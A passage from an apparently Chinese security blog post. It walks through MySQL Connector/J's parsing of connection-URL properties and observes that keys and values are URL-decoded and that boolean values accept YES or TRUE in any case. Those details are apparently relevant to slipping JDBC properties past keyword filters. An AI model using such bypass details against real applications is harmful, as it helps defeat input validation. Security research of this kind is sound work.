class="built_in">this</span>.injectPerTypeProperties(<span class="built_in">this</span>.properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进getProperties⽅法，会⼀直调⽤到parseQuerySection⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.parsedProperties == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parseQuerySection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Collections.unmodifiableMap(<span class="built_in">this</span>.parsedProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法判断URL是否存在扩展参数，存在则调⽤processKeyValuePattern⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseQuerySection</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNullOrEmpty(<span class="built_in">this</span>.query)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parsedProperties = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parsedProperties = <span class="built_in">this</span>.processKeyValuePattern(PROPERTIES_PTRN, <span class="built_in">this</span>.query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(kvMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(); matcher.find(); p = matcher.end()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (matcher.start() != p) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (WrongArgumentException)ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.4&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;input.substring(p)&#125;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> decode(StringUtils.safeTrim(matcher.group(<span class="string">&quot;key&quot;</span>)));</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> decode(StringUtils.safeTrim(matcher.group(<span class="string">&quot;value&quot;</span>)));</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>分离key和value，然后进⾏⼀次Urldecode，同样可以进⾏Urlencode编码</p>
<p>Key Value </p>
<p>com.mysql.cj.conf.BooleanPropertyDefinition的AllowableValue枚举类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">enum</span> <span class="title class_">AllowableValues</span> &#123;</span><br><span class="line">    TRUE(<span class="literal">true</span>),</span><br><span class="line">    FALSE(<span class="literal">false</span>),</span><br><span class="line">    YES(<span class="literal">true</span>),</span><br><span class="line">    NO(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>所以设置TRUE和设置YES是⼀样的 解析时还会转⼤写</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Boolean <span class="title function_">parseObject</span><span class="params">(String value, ExceptionInterceptor exceptionInterceptor)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BooleanPropertyDefinition.AllowableValues.valueOf(value.toUpperCase()).asBoolean();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/09/13/SICTF/" rel="prev" title="SICTF CC7+CC3">
                  <i class="fa fa-angle-left"></i> SICTF CC7+CC3
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/10/28/activemq/" rel="next" title="ActiveMQ">
                  ActiveMQ <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baicany</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
</html>
